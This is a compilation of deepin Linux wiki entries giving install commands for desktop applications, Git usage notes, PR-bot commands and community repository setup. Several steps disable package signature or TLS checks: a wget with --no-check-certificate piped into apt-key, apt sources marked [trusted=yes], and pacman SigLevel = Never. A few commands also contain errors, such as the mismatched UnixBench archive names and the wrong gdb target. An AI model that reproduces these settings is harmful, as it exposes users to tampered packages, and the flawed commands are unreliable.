他人使用仓库需下载并添加 gpg key：wget --no-check-certificate -qO - http://<youraddress>/repo/claystan.gpg.key| sudo apt-key add -，并配置 sources.list 添加仓库地址。

标题：DBeaver
DBeaver是通用数据库管理工具和SQL客户端，支持多种数据库。

DBeaver提供图形界面，可查看数据库结构、执行SQL等。

安装DBeaver的命令是sudo apt-get install dbeaver-ce。

卸载DBeaver的命令是sudo apt-get remove dbeaver-ce。

DBeaver的仓库地址是http://packages.deepin.com/deepin/pool/non-free/d/dbeaver-ce/。

标题：MySQL_Workbench
MySQL Workbench是专为MySQL设计的ER/数据库建模工具，提供数据建模、SQL开发和管理工具，支持其他RDBMS迁移至MySQL。

安装MySQL Workbench的命令是sudo apt-get install mysql-workbench。

卸载MySQL Workbench的命令是sudo apt-get remove mysql-workbench。

MySQL Workbench的仓库地址是http://packages.deepin.com/deepin/pool/main/m/mysql-workbench/。

标题：Navicat
Navicat是一个数据库管理工具，专为简化数据库的管理及降低系统管理成本。以直觉化的图形用户界面而建，可安全简单地创建、组织、访问并共用信息，支持管理MySQL、MariaDB、SQL Server、SQLite、Oracle和PostgreSQL的数据库。

安装Navicat的命令是sudo apt-get install navicat。

卸载Navicat的命令是sudo apt-get remove navicat。

Navicat的仓库地址是http://packages.deepin.com/deepin/pool/non-free/n/navicat/。

标题：Git
git是一个开源的分布式版本控制系统，出自Linux Torvalds。

版本控制是记录一个或若干文件内容变化，以便将来查阅特定版本修订情况的系统。

Git性能优良，绝大多数操作在本地执行，用哈希值保证数据完整性，上手难度比SVN高。

安装Git可使用sudo apt install -y git，或sudo apt install -y git-all安装所有模块。

验证Git安装可执行git --version命令。

标题：Git命令详解
Workspace：工作区；Index / Stage：暂存区；Repository：仓库区（或本地仓库）；Remote：远程仓库

在当前目录新建一个Git代码库：git init；新建一个目录并初始化为Git代码库: git init [project-name]；下载项目和整个代码历史: git clone [url]

显示当前的Git配置: git config --list；编辑Git配置文件: git config -e [--global]；设置提交用户信息: git config [--global] user.name "[name]"、git config [--global] user.email "[email address]"

添加指定文件到暂存区: git add [file1] [file2]；添加指定目录到暂存区（含子目录）: git add [dir]；添加当前目录所有文件到暂存区: git add .；分次提交同一文件多处变化: git add -p

删除工作区文件并放入暂存区: git rm [file1] [file2]；停止追踪指定文件但保留在工作区: git rm --cached [file]；改名文件并放入暂存区: git mv [file-original] [file-renamed]

提交暂存区到仓库区: git commit -m [message]；提交暂存区指定文件到仓库区: git commit [file1] [file2] ... -m [message]；提交工作区自上次commit后的变化到仓库区: git commit -a；提交时显示所有diff信息: git commit -v

用新commit替代上一次提交（无新变化时改写信息）: git commit --amend -m [message]；重做上一次commit并包括指定文件新变化: git commit --amend [file1] [file2]

列出所有本地分支: git branch；列出所有远程分支: git branch -r；列出所有本地和远程分支: git branch -a；新建分支但停留在当前分支: git branch [branch-name]

新建分支并切换到该分支: git checkout -b [branch]；新建分支指向指定commit: git branch [branch] [commit]；新建分支与指定远程分支建立追踪关系: git branch --track [branch] [remote-branch]

切换到指定分支并更新工作区: git checkout [branch-name]；切换到上一个分支: git checkout -；在现有分支与指定远程分支间建立追踪关系: git branch --set-upstream [branch] [remote-branch]

合并指定分支到当前分支: git merge [branch]；选择一个commit合并进当前分支: git cherry-pick [commit]；删除分支: git branch -d [branch-name]；删除远程分支: git push origin --delete [branch-name]、git branch -dr [remote/branch]

列出所有tag: git tag；新建tag在当前commit: git tag [tag]；新建tag在指定commit: git tag [tag] [commit]；删除本地tag: git tag -d [tag]

删除远程tag: git push origin :refs/tags/[tagName]；查看tag信息: git show [tag]；提交指定tag: git push [remote] [tag]；提交所有tag: git push [remote] --tags

新建分支指向某个tag: git checkout -b [branch] [tag]；显示有变更的文件: git status；显示当前分支的版本历史: git log；显示commit历史及每次变更的文件: git log --stat

标题：git实践手册
当在网上下载git源代码后进行了无关紧要的更改，想同步到新的版本却不想处理合并问题时，可使用命令：git reset --hard origin/v5.4.13 强制切换到源仓库上的v5.4.13 tag版本。

标题：git实践手册：下载特定版本源代码
若不想下载整个git仓库，只想获取最新版本，可使用 --depth=1 选项，如命令：git clone --depth=1 https://github.com/deepinwiki/wiki.wiki.git，该命令只下载一个版本，即默认的最新版本。

标题：git实践手册：查看远程仓库版本和分支
要查看远程仓库的版本和分支信息，可使用 git ls-remote 命令。在该命令后可添加 --tags 选项查看版本，--heads 选项查看分支，在仓库链接后还能设置匹配字符串，例如 git ls-remote https://github.com/deepinwiki/wiki.wiki.git 。版本信息中，HEAD表示当前工作版本，refs/heads/master是默认主分支，refs/heads/uefi是自定义分支，refs/tags/v5.4.13是自定义tag即特定版本。

标题：git实践手册：下载指定版本源代码
若要下载仓库的指定版本，可使用 git clone 命令并结合 --depth=1 和 --branch 选项，其中 --branch 用于指定版本（不一定是分支，任意版本均可），例如命令：git clone --depth=1 --branch=vol.35 https://github.com/521xueweihan/HelloGitHub.git 。

标题：git实践手册：克隆后跳转其他远程版本
克隆仓库后想跳转到本地没有的其他远程版本且不重新克隆时，可先使用 git ls-remote origin 查看远程信息（origin是远程仓库默认命名）；然后用 git pull origin v5.4.15 下载远程对象（该命令会下载两个版本之间的所有版本），或用 git fetch 下载相关对象如tag；接着通过 git log --oneline --graph --all 查看当前版本历史，最后使用 git checkout 版本标识（如0092579）或tag（如vol.41）跳转到目标版本。也可使用 git pull --depth=1 origin vol.41 不下载过多相关版本，若提示内容不相干，同步内容会放在FETCH_HEAD，再用 git checkout FETCH_HEAD 跳转。

标题：git常用功能
git 是现在最常用的同步和版本管理工具。同步就是将两地的文档版本同步，一个中心（git 仓库网站/服务器），多地编辑。版本管理是每一次修改，提交，都会形成一个新的版本，新旧版本直接可以跳转回溯，甚至生成分支。

1. git init 目录 ：普通仓库
2. git init --bare 目录：裸仓库
3. git clone 源 目录：克隆创建

所谓的仓库，实际上是一个普通目录，里面的内容是任意的，仓库的信息存在 .git 子文件夹。而所谓的裸仓库，就是只有 .git 文件夹，即只有信息，而不能对文档进行编辑。仓库服务器，一般是创建裸仓库，因为它是给异地的普通仓库同步用的，普通仓库会显示文档内容，可以对文档进行编辑。

标题：Pull Request 机器人命令列表
命令：/check，说明：重新触发所有 CI 检查

命令：/check jobname，说明：重新触发 jobname 检查

命令：/assign @username，说明：指派 @username 处理 PR

命令：/review @username，说明：添加 @username 为代码评审人员

命令：/merge，说明：在满足所有合并要求时，执行合并

命令：/+1 或 /approve，说明：添加一个 approve 标签（限维护者使用）

假定你要重新触发一个显示为 build-distribution / check_job / archlinux-build 的任务，那么你需要使用 /check archlinux-build 或 /check check_job/archlinux-build 任一方式进行触发。

使用油猴脚本简化PR命令操作的第一步：在浏览器安装 Tampermonkey 插件

在 Tampermonkey 插件中从URL安装脚本的步骤：打开管理面板 - 实用工具，找到“从 URL 安装”，输入 https://raw.githubusercontent.com/deepin-community/deepin-chatopt-script/main/chatopt.js

油猴脚本安装成功后，在 GitHub 的 Pull Request 页面评论框下放会自动添加 /merge 和 /check 相关操作按钮。

PR 合并要求：1. 至少有一个有效的 Approval（加分/合并许可）；2. 所有 CI 检查通过

请注意: /approve 仅为添加标记的目的，对于实际的代码评审，请使用 GitHub 的代码评审流程。

命令                  | 说明
---------------------|---------------------------
`/check`             | 重新触发所有 CI 检查
`/check jobname`     | 重新触发 *jobname* 检查
`/assign @username`  | 指派 @username 处理 PR
`/review @username`  | 添加 @username 为代码评审人员
`/merge`             | 在满足所有合并要求时，执行合并
`/+1` or `/approve`  | 添加一个 approve 标签（限维护者使用）

假定你要重新触发一个显示为 `build-distribution / check_job / archlinux-build` 的任务，那么你需要使用 `/check archlinux-build` 或 `/check check_job/archlinux-build` 任一方式进行触发。

1. 至少有一个有效的 Approval（加分/合并许可）
2. 所有 CI 检查通过

标题：topic仓库机制
为方便可持续开发集成等需求，启动topic的管理机制，对代码变更进行标签化的分类，可以很方便的选择提交PR时自动构建的产物存放的仓库，方便进行rc（release-candidate）阶段的多源码包相关性项目进行联调测试，简化集成流程，提高集成准确率、自动化率，方便后期的主题相关的代码、软件包仓库的回溯。使用方式如下：1. 从deepin-comunity fork 项目到个人账户下；2. 从个人账户下clone项目到本地；3. 添加upstream相关信息，命令为git remote add upstream "urlxxxx"、git checkout upstream/master、git checkout -b topic-grep-test（切出本地分支，若需要使用topic机制需采用topic-开头的形式命名分支）；4. 修复代码，推送topic开头命令的分支到个人账户下的仓库中；5. 提交PR，从topic分支合入到upstream的master分支；6. 构建通过后的deb包自动推送到topic仓库中，仓库地址是https://ci.deepin.com/repo/obs/deepin:/CI%3A/topics%3A/（合并之后自动在ci仓库下创建grep-test的仓库）；7. 仓库使用方式为echo "deb [trusted=yes] https://ci.deepin.com/repo/obs/deepin:/CI%3A/topics%3A/devscript/deepin_develop/ ./" >> /etc/apt/source.list；8. 参考样例为https://github.com/deepin-community/grep/pull/5。

标题：使用action创建新的git仓库
ps: 当前自动化构建是基于commit进行触发，每当有一个commit合入则触发action的自动构建并导入仓库中，请注意不要随意在正式环境中使用下面的仓库，仓库的软件包大多没有经过测试验证，我们无法保证仓库的软件包的稳定性。

## archlinux

### 添加仓库

在 `/etc/pacman.conf` 中添加以下内容：

```
[deepin]
SigLevel = Never
Server = https://deepin-community.github.io/arch-dde-repo
```

所有构建的包，均属于 `deepin-git` group，可通过安装该 group 所有软件包替换 `deepin` group 的所有软件包。

### 问题修复

有时候项目会需要增加依赖，或者减少依赖，导致 archlinux 平台无法完成构建，那么需要在 [https://packages.archlinux.org/](https://packages.archlinux.org/) 查询相关软件包，并添加到 archlinux/PKGBUILD 文件的 makedepends 中，如果是运行时依赖，还需要同时添加到 depends 中。

### 本地验证

本地验证可以保存以下脚本，在项目的根目录运行，即可完成一次打包测试。

```bash
#!/bin/bash

rm -rf $(basename $PWD)-git
mkdir $(basename $PWD)-git
rsync -a . $(basename $PWD)-git --exclude "$(basename $PWD)-git"
tar -czf archlinux/source.tar.gz $(basename $PWD)-git
version=1.0.0
sed -i "/pkgver=/cpkgver=${version}" archlinux/PKGBUILD
echo "deepin_source_name=$(basename $PWD)-git" >> archlinux/PKGBUILD
cd archlinux
deepin-x86_64-build
```

使用该脚本，需要先添加 `deepin-git` 仓库，安装 `devtools-deepin-git` 软件包。

## debian sid

### 添加仓库

在 `/etc/apt/sources.list.d/deepin-git.list` 中添加以下内容:

```
deb [trusted=yes arch=amd64] https://deepin-community.github.io/debian-sid-dde-deps-repo sid main
deb [trusted=yes arch=amd64] https://deepin-community.github.io/debian-sid-dde-repo sid main
```

debian sid 提供了两个仓库，理论上所有发行版仓库都会提供两个仓库，一个是保存 deepin 构建的软件包，另一个是提供官方仓库的补充。

在 debian sid 仓库中，只要添加该仓库，所有 deepin 的软件包均会升级到最新版本。

### 国内镜像站点
```
deb [trusted=yes arch=amd64] https://code.gitlink.org.cn/justforlxz/deepin-dde-repo/raw/branch/main apricot main
deb [trusted=yes arch=amd64] https://code.gitlink.org.cn/justforlxz/deepin-dde-deps-repo/raw/branch/main apricot main

deb [trusted=yes arch=amd64] https://code.gitlink.org.cn/justforlxz/debian-sid-dde-repo/raw/branch/main sid main
deb [trusted=yes arch=amd64] https://code.gitlink.org.cn/justforlxz/debian-sid-dde-deps-repo/raw/branch/main sid main

[deepin]
SigLevel = Never
Server = https://code.gitlink.org.cn/justforlxz/arch-dde-repo/raw/branch/main
```

标题：GitKraken
GitKraken是一款Git客户端，它使用图形化的界面，以减少命令行操作，安装使用不需要任何依赖，可以在界面上查看和移动窗口，还可以进行搜索；gitkraken还可以连接到你的GitHub或者bitbucket账户并帮助你找到项目，支持SSH加密。安装命令为sudo apt-get install gitkraken，卸载命令为sudo apt-get remove gitkraken，其仓库地址为http://packages.deepin.com/deepin/pool/main/g/gitkraken/

标题：SmartCVS
SmartCVS是一款用于CVS的版本控制应用，基于TCP/IP协议的版本控制工具，它具有内建的文件比较、合并工具、事务显示、列出Repository文件等功能，美观的用户界面，一目了然的功能，同时可以运行在所有的JDK环境中。安装命令为sudo apt-get install smartcvs，卸载命令为sudo apt-get remove smartcvs，仓库地址为http://packages.deepin.com/deepin/pool/main/s/smartcvs。

标题：SmartSVN
SmartSVN是一个图形化的SVN客户端，其最大的优势就是操作非常简单和方便，大部分操作都可以通过鼠标点击完成。其中支持多种认证机制：SVN、SVN+SSH、Http、Https、Http代理；支持所有的svn命令、支持标签操作、智慧化程度高、方便的导航系统等功能。安装命令为sudo apt-get install smartsvn，卸载命令为sudo apt-get remove smartsvn，仓库地址是http://packages.deepin.com/deepin/pool/main/s/smartsvn/

标题：Subversion
Subversion是一个自由开源的版本控制系统。安装命令为sudo apt-get install subversion。卸载命令为sudo apt-get remove subversion。仓库地址为http://packages.deepin.com/deepin/pool/main/s/subversion/。官方网站是https://subversion.apache.org/。

标题：D-Feet
D-Feet是一个易于使用的D-bus调试器，用来检查D-bus接口的运行程序和调用接口的方法。可以显示service提供的所有对象、信号和方法，还可以通过它实现方法调用。安装命令为sudo apt-get install d-feet，卸载命令为sudo apt-get remove d-feet，其仓库地址为http://packages.deepin.com/deepin/pool/main/d/d-feet/

标题：debuginfod 介绍
软件的bug通常是不可避免的，开发者通常使用gdb，systemtap这些使用工具加载debuginfo来定位问题。一般源代码是人类可读的，机器不可读，而二进制文件是机器可读，人类不可读的。当程序遇到问题时，机器只知道运行的指令是什么，人类一般无法通过二进制指令来快速定位问题。此时就需要将此处的指令和源代码关联起来，当运行的指令出现bug时，可以快速的关联到源代码的位置上。debuginfo就是起到这个作用，是二进制指令到源代码的一个桥梁。调试信息一般就是变量名，变量类型，函数名，函数参数，函数的地址范围，行号和地址的对应关系等等，这些内容按照一定的格式写入到编译的文件中。现在最常用的格式是 DWARF(Debugging With Attributed Record Formats) 。有关`DWAERF`（https://dwarfstd.org）的介绍请见(https://dwarfstd.org/doc/Debugging%20using%20DWARF-2012.pdf)。

debuginfod 是一个用于传输调试信息资源的http文件服务器。debuginfod会定期扫描指定路径下的内容，比如deb和rpm打包文件等。从中提取基于`Build-id`的调试信息和可执行文件，并使用`sqlite`来保存这些信息。当用户使用客户端工具访问已知的`Build-id`的调试信息时，debuginfod就会返回对应的资源。支持获取`debuginfo`，`executable`和`source file`。文件的`Build-id`可以使用`readelf`命令来获取，比如获取`dde-dock=5.5.66-1`的`Build-id`。

debuginfod支持扫描deb，rpm和ELF/DWARF文件格式。下面是一些简单搭建使用的参数，更多参数请参考debuinfod的man手册。-U path/to/debs/ # 扫描的deb文件路径。-R path/to/rpms/ # 扫描的rpm文件路径。-I REGEX --include=REGEX -X REGEX --exclude=REGEX # 扫描过程中排除和包含文件的正则规则。-p port # 启动的端口。-L # 是否处理symlink，当目录中包含软连接时，需要开启这个参数。在deepin上，使用下面命令快速启动一个`debuginfod`服务器。默认端口为8002。sudo apt insatll debuginfod；debuginfod -U path/to/debs/。可以通过编写service文件使用systemd 来对debuginfod的服务做管理。[Unit] Description=Debuginfod Service Documentation=man: debuginfod(8) After=network.target nginx.service [Service] EnvironmentFile=/etc/sysconfig/debuginfod ExecStart=/usr/bin/debuginfod --port=${PORT} --database=${DATABASE_FILE} -U ${REPO_PATH} [Install] wantedBy=multi-user.target

配置`DEBUGINFOD_URLS`环境变量指向上游的debuginfod服务器，比如在deepin上使用deepin提供的debuginfod服务器。如果长期使用，可配置到`.bashrc`文件中。export DEBUGINFOD_URLS=https://debuginfod.deepin.com。然后使用对debuginfod支持的客户端来获取调试信息。比如`debuginfod-find`,`gdb`,`systemtap` ,`perf`等。deepin 20通过gdb加载debuginfod的调试信息：sudo apt install gdb；export DEBUGINFOD_URLS=https://debuginfod.deepin.com；gdb /usr/bin/gdb；出现下面提示即从debuginfod服务器下载并加载调试信息：Reading symbols from /usr/bin/dde-dock... Downloading separate debug info for /usr/bin/dde-dock... Reading symbols from /home/tsic/.cache/debuginfod_client/3f958ed5f3924da2e3ba2e07a9e065ecbba59437/debuginfo... ....... Starting program: /usr/bin/dde-dock ....... Downloading separate debug info for /lib/x86_64-linux-gnu/libdtkwidget.so.5... ....... Downloading separate debug info for /lib/x86_64-linux-gnu/libsystemd.so.0...

1.  debuginfod对deb打包方式获取源码的支持有限，请见[can't download source code](https://wiki.debian.org/Debuginfod#The_service_isn.27t_working.21__I_can.27t_download_the_source_code_while_debugging_a_package.21)。2.  各个client对debuginfod的支持情况（2022.08）以下数据来自[debuginfod](https://sourceware.org/elfutils/Debuginfod.html)。elfutils在version 0.178, 2019-11已发布支持；systemtap通过elfutils自动支持；binutils在version 2.34, 2020-02已发布支持；gdb在version 10.1, 2020-10已发布支持等。

标题：Unix Bench
Unix Bench是一个知名的Linux硬件性能测试软件，它适用于Unix-Like系统，测试完成后可以到这个网站来查看硬件的详细信息https://code.google.com/p/byte-unixbench/。运行测试的步骤为：wget https://github.com/kdlucas/byte-unixbench/archive/v5.1.3.tar.gz；tar zxf UnixBench5.1.3.tgz；cd byte-unixbench-5.1.3；make all；Run。

标题：搭建selenium环境
搭建selenium环境介绍在deepin下搭建selenium环境。安装pip3：在终端中输入：sudo apt-get install python3-pip。安装selenium：在终端中输入：sudo pip3 install selenium。下载并安装最新的驱动：在终端中输入：LATEST=$(wget -q -O - http://chromedriver.storage.googleapis.com/LATEST_RELEASE)；在终端中输入：wget http://chromedriver.storage.googleapis.com/$LATEST/chromedriver_linux64.zip。解压chromedriver：在终端中输入：unzip chromedriver_linux64.zip。将chromedriver放置至/usr/local/bin/：在终端中输入：sudo -S mv chromedriver /usr/local/bin/。下载谷歌浏览器：https://www.google.cn/intl/en_uk/chrome/browser-tools/

标题：Master PDF Editor
Master PDF Editor 是一款功能强大的PDF和XPS文档编辑工具，它可以帮助您查看和编辑PDF和XPS文档。它支持PDF和XPS文件导入/导出到JPG、 TIFF、 PNG或BMP格式。同时，对于常见的PDF阅读需求，如添加注释、高亮显示等也能很好的支持。

Master PDF Editor 在Linux系统中的安装命令为：sudo apt install net.code-industry.master-pdf-editor

Master PDF Editor 在Linux系统中的卸载命令为：sudo apt remove --purge net.code-industry.master-pdf-editor

Master PDF Editor 的软件仓库地址为：http://packages.deepin.com/deepin/pool/main/m/master-pdf-editor/

Master PDF Editor 并非免费软件，未注册版本会有水印。

Master PDF Editor 默认打开为英文，切换为中文需要点击 Tools 菜单->Settings->Language 选项卡，将“Built-in"修改为简体中文。

Master PDF Editor 官方网站的网址是：https://code-industry.net/masterpdfeditor/

Master PDF Editor 并非免费软件，未注册版本会有水印。软件默认打开为英文，切换为中文需要点击 Tools 菜单->Settings->Language 选项卡，将"Built-in"修改为简体中文。

标题：PDF-Shuffler
PDF-Shuffler是一个PDF合并及分割工具，它可以把几个PDF文件合并为一个PDF文件，还可以对PDF文件进行分割成几个PDF文件，以及删除PDF文件中的一些页面。安装命令为sudo apt-get install pdfshuffler，卸载命令为sudo apt-get remove pdfshuffler，其仓库地址为http://packages.deepin.com/deepin/pool/main/p/pdfshuffler/

标题：PdfMod
PdfMod是一个PDF文档编辑应用，它可以对页面进行重新排序、旋转和删除操作，能够对文档的标题、作者等元素进行编辑、多个文件可以通过拖放合并，也能够将图片导出或导入到PDF文档中。安装命令为sudo apt-get install pdfmod，卸载命令为sudo apt-get remove pdfmod，仓库地址是http://packages.deepin.com/deepin/pool/main/p/pdfmod/。

标题：Sejda PDF Desktop
Sejda PDF Desktop 是一款免费且易于使用的 PDF 编辑软件，拥有合并、拆分、转换、压缩、编辑、加密 PDF 文件等多种功能。安装命令为 wget https://sejda-cdn.com/downloads/sejda-desktop_7.5.3_amd64.deb 然后 sudo apt install ./sejda-desktop_7.5.3_amd64.deb。卸载命令是 sudo apt remove --purge sejda-desktop。其免费版功能有一定限制，官方网站为 https://www.sejda.com/desktop。

标题：Smallpdf
Smallpdf是一款在线PDF处理工具，不用下载或安装软件，您就可以在浏览器上轻松处理各种PDF文件。Smallpdf支持 Word、Excel、PPT、JPG格式的文件转PDF。除此之外，Smallpdf还具有PDF分割、PDF合并、PDF压缩以及PDF解密等功能。安装命令为sudo apt-get install apps.com.smallpdf，卸载命令为sudo apt-get remove apps.com.smallpdf，其仓库地址为http://packages.deepin.com/deepin/pool/main/d/deepin-webapps/

标题：GIMP
GIMP是一款跨平台的图像处理软件，支持BMP、GIF、JPG、PNG等格式的图像处理。GIMP支持绝大多数的PhotoShop插件，既可以作为简单的画图工具，又可以作为专业的照片处理工具，包括照片润饰、图像合成、图像格式转换等。

安装命令：sudo apt-get install gimp；卸载命令：sudo apt-get remove gimp

GIMP的仓库地址是http://packages.deepin.com/deepin/pool/main/g/gimp/

标题：Inkscape
Inkscape是一款矢量绘图软件，支持形状、路径、文本、标记、变换、渐变等SVG特性。它除了可以绘制基本的点、线、面、矩形、曲线，还可以进行三维颜色的填充等，支持JPG、PNG、TIFF等多种图片格式。

安装命令：sudo apt-get install inkscape；卸载命令：sudo apt-get remove inkscape；仓库地址：http://packages.deepin.com/deepin/pool/main/i/inkscape/

标题：Krita
Krita 是一款自由开源的数字绘画软件，使用 GPL 许可证发布。它主要针对手绘用途设计，具备高度可定制的笔刷系统和完善的图层功能，可通过透明度和变形蒙版来实现非破坏性编辑。它能够绘制位图图像、矢量图形和制作动画，并具备完善的色彩管理功能，能够进行 HDR 图像的编辑和调试。它的操作直观，界面干扰较少，支持多线程并能够使用 OpenGL 加速画布显示。Krita 是一款跨平台软件，支持 Windows、Linux 和 Mac OSX。Krita 是 KDE 的子项目之一，原先是 KOffice 1.4 的一个组成部分。KOffice 后来改名为 Calligra，Krita 在 3.0 版起从 Calligra 项目分离出来，但依然是 KDE 的一部分。2013 年 Krita 社区成立了 Krita 基金会为项目提供资金支持，此后更是连续三年成功地进行了 Kickstarter 众筹，为项目募集了资金以支持两位全职开发人员的工作，让软件的开发得到了大幅推进。“Krita”是一个瑞典语单词，它的含义是“绘画”和“粉笔”。该项目的曾用名包括“KImageShop”和“Krayon”，但它们因为商标问题已被弃用。Krita 使用 C++ 编写，基于 KDE Frameworks 和 Qt，支持 Python 脚本扩展。Krita 的吉祥物是 Kiki，一只由 Tyson Tan 设计的电子松鼠。

Krita 的安装命令为 sudo apt-get install krita，卸载命令为 sudo apt-get remove krita。Krita 的近年来的开发比较迅速，每个新版都会带来意义重大的改进，而 LTS 的软件仓库版本过于老旧。因此建议使用官方维护的 PPA：sudo add-apt-repository ppa:kritalime/ppa，然后执行 sudo apt-get update。

Krita 4.0 版的矢量引擎已经更改。它从原先 Calligra 的自有组件换成了一个全新编写的 SVG 标准矢量引擎。Krita 4.0 和之后的版本将无法保证正常解析 3.0 系列以及之前版本保存的矢量图层。请留意。

Krita 使用 OpenGL 加速来实现高品质的缩放、旋转，并极大地提升绘画的响应速度。要发挥 OpenGL 加速的真正价值，你的 GPU 需要支持 OpenGL 3.0 以上。各主要 GPU 生产商开始支持 OpenGL 3.0 的产品线和发布时间如下：Intel：第三代 HD Graphics 系列，IvyBridge 或 Bay-Trail 架构，2012 年。代表产品：Celeron J1x00、N2x00、Celeron (G)1xx0、Pentium J2x00、N3500、Pentium (G)2xx0、Core i3/5/7-3xx0 等。AMD/ATI：Radeon HD 2000 系列，TeraScale 1 架构，2007 年。代表产品：Radeon HD 2400 PRO、Radeon HD 2600 PRO 等。Nvidia：GeForce 8 系列，Tesla 架构，2006 年。代表产品：GeForce 8400 GS、GeForce 8800 GTS / 9800 GTX / GTS 250 等。

Krita 的仓库地址为 http://packages.deepin.com/deepin/pool/main/k/krita/。相关链接包括官方网站：https://krita.org/，维基百科页面：https://en.wikipedia.org/wiki/Krita，Krita Lime PPA：https://launchpad.net/~kritalime/+archive/ubuntu/ppa。

标题：LightZone
LightZone是一款数码图象编辑工具，它支持常见TIFF、JPEG、DNG格式外，还支持主流品牌相机的RAW文件，它具有减少高ISO数字图象的噪声，选择性地削尖或模糊图象，去除斑点等功能。安装命令为sudo apt-get install lightzone，卸载命令为sudo apt-get remove lightzone，其仓库地址为http://packages.deepin.com/deepin/pool/main/l/lightzone/

标题：显示器
显示屏是一种输出设备，用于显示图像及色彩。

显示器主要分类包括阴极射线管显示屏(CRT)、液晶显示屏(LCD)、等离子显示屏(PDP)、投影式显示屏、立体成像显示屏、有机发光二极管显示屏、电子纸、发光二极管显示屏。

查看显示器信息可在终端执行xrandr命令，更多选项参考xrandr的帮助文档man xrandr。

xrandr --output VGA-1 --right-of LVDS-1 可设置VGA-1（外置显示器）在LVDS-1的右侧。

使用cvt 1920 1080可查看1920×1080的信息。

sudo xrandr --newmode "1920x1080_60.00″ 173.00 1920 2048 2248 2576 1080 1083 1088 1120 -hsync +vsync可添加1920×1080的新模式。

sudo xrandr --addmode VGA-1 “1920x1080_60.00″ 可将新的1920×1080分辨率加给VGA-1。

xrandr --output VGA-1 --mode 1920x1080_60.00 --rate 60 可将外置显示器分辨率设置为1920×1080。

在命令行中输入1920×1080中的乘号时，用字母“x”替代即可。

标题：MyPaint
MyPaint是一个图像绘画工具，操作简单，内置57个笔刷，支持手绘板，有无限尺寸画布，可保存为PNG等格式。

安装MyPaint的命令是sudo apt-get install mypaint。

卸载MyPaint的命令是sudo apt-get remove mypaint。

MyPaint的仓库地址是http://packages.deepin.com/deepin/pool/main/m/mypaint/。

标题：Polarr
Polarr（泼辣修图）是一个智能图片处理工具，具有色温调整、区域色调系数等功能。

安装Polarr的命令是sudo apt-get install polarr。

卸载Polarr的命令是sudo apt-get remove polarr。

Polarr的仓库地址是http://packages.deepin.com/deepin/pool/main/p/polarr/。

Polarr的目的是打造专业级的图片处理引擎，创作最佳图片效果，让图片有独特艺术风格。

标题：RawTherapee
RawTherapee是处理数码相机RAW图像的软件，可批量处理，跨平台支持Windows、macOS和Linux。

安装RawTherapee的命令是sudo apt install com.pic.rawtherapee。

卸载RawTherapee的命令是sudo apt remove --purge com.pic.rawtherapee。

RawTherapee的仓库地址是http://packages.deepin.com/deepin/pool/main/r/rawtherapee/。

RawTherapee的维基百科（英文）链接是https://en.wikipedia.org/wiki/RawTherapee，官方网站是https://www.rawtherapee.com/。

标题：Scan_Tailor
Scan Tailor是用于扫描件后期处理的软件，可处理原始扫描并输出PDF或DJVU格式文件，能执行页面拆分等操作。

安装Scan Tailor的命令是sudo apt-get install scantailor。

卸载Scan Tailor的命令是sudo apt-get remove scantailor。

Scan Tailor的仓库地址是http://packages.deepin.com/deepin/pool/main/s/scantailor/。

标题：XnSketch
XnSketch是一款能将图片转换成卡通或素描风格的图片处理应用，有多种特效，可设置多项参数，支持一键分享。

安装XnSketch的命令是sudo apt-get install xnsketch。

卸载XnSketch的命令是sudo apt-get remove xnsketch。

XnSketch的仓库地址是http://packages.deepin.com/deepin/pool/non-free/x/xnsketch/。

标题：ArcTime
ArcTime是一款可视化字幕编辑器，独创字幕块概念，可在时间线上拖动、调整字幕块完成字幕创建。

ArcTime支持读写SRT字幕文件、导出ASS等多种外挂字幕格式，支持独立工程文件，可保存工作空间内容与设定。

ArcTime可通过交换工程文件或网络连接与伙伴协同工作，完成后单击“视频转码”按钮可压制字幕。

ArcTime可将纯字幕输出为XML+PNG序列、Fcpxml等格式，应用到影视后期流程中。

安装ArcTime的命令是：sudo apt-get install arctime。

卸载ArcTime的命令是：sudo apt-get remove arctime。

ArcTime的仓库地址是http://packages.deepin.com/deepin/pool/non-free/a/arctime/。

标题：Gaupol
Gaupol是一个字幕编辑软件，支持多种字幕文件格式，可编辑文本、定时字幕时间与视频匹配，还有快捷键、第三方扩展、拼写检查、语音识别等功能。

安装Gaupol的命令是sudo apt-get install gaupol。

卸载Gaupol的命令是sudo apt-get remove gaupol。

Gaupol的仓库地址是http://packages.deepin.com/deepin/pool/main/g/gaupol/。

标题：Kdenlive
Kdenlive是基于MLT框架、KDE和Qt的自由开源非线性视频编辑器，注重灵活性和易用性。

通过官方仓库安装20.04版本Kdenlive的命令是sudo apt install org.kdenlive.kdenlive。

安装Kdenlive官网最新版22.04.3版本（AppImage）需执行wget https://download.kde.org/stable/kdenlive/22.04/linux/kdenlive-22.04.3-x86_x64.AppImage、chmod +x kdenlive-22.04.3-x86_x64.AppImage、./kdenlive-22.04.3-x86_x64.AppImage。

卸载官方仓库20.04版本Kdenlive的命令是sudo apt remove --purge org.kdenlive.kdenlive。

卸载Kdenlive官网22.04.3版本（AppImage）的命令是rm -f kdenlive-22.04.3-x86_x64.AppImage。

Kdenlive的仓库地址是http://packages.deepin.com/deepin/pool/main/k/kdenlive/。

Kdenlive软件无法打开、闪退时，需检查Deepin是否在虚拟机里运行，显卡驱动是否正常。

Kdenlive官方网站是https://kdenlive.org/zh/，维基百科链接是https://zh.wikipedia.org/zh-cn/Kdenlive。

标题：Lightworks
Lightworks是一款非线性视频编辑器，具有特效制作、色彩校正等功能。

安装Lightworks的命令是sudo apt-get install lightworks。

卸载Lightworks的命令是sudo apt-get remove lightworks。

Lightworks的仓库地址是http://packages.deepin.com/deepin/pool/non-free/l/lightworks/。

标题：Natron
Natron是一个跨平台的视频合成软件，具有多种视频特效、图形视频处理、多层剪辑、关键帧编辑、导出/导入、分享视频等功能。

安装Natron的命令是sudo apt-get install natron。

卸载Natron的命令是sudo apt-get remove natron。

Natron的仓库地址是http://packages.deepin.com/deepin/pool/non-free/n/natron/。

标题：OpenShot
OpenShot是一个视频编辑软件。

OpenShot支持视频实时预览并剪贴缩放、修剪和切割等功能。

安装OpenShot的命令是sudo apt-get install openshot。

卸载OpenShot的命令是sudo apt-get remove openshot。

OpenShot的仓库地址是http://packages.deepin.com/deepin/pool/main/o/openshot/。

OpenShot有视频合成、图像叠加层、水印等功能。

OpenShot可提供3D动画标题功能。

标题：Shotcut
Shotcut是一款跨平台的视频编辑器软件，支持视频特效滤镜、直接拖曳视频处理等功能。

安装Shotcut的命令是sudo apt-get install shotcut。

卸载Shotcut的命令是sudo apt-get remove shotcut。

